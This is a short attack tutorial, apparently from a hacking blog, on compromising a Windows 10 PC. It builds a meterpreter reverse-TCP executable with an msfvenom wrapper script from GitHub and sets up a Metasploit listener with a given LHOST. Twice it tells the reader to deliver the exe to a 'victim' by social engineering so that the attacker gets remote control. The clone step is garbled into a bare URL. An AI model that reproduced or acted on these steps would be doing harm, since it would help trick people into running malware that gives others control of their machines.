Exploit Windows 10 PC using msfven.sh Script

Open your kali Linux terminal and type the following command
https://github.com/wayneaswilliams/msfvenom_custom_encoding.git

Now type following command to create payload
./msfven.sh
 Now Enter IP addresses of your kali Linux pc. And press enter. In next step it will ask for port no. Enter the port no.  Such as 4445 and press enter
In next step use payloads e.g.windows/meterpreter/reverse_tcp and press enter


Now it will show a file with name tcp_445.exe now send your exe files to victim using any social engineering technique.

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.140
exploit
 Now send your exe files to victim using any social engineering technique. Now when the victim will use exe you will get the meterpreter of victim PC.
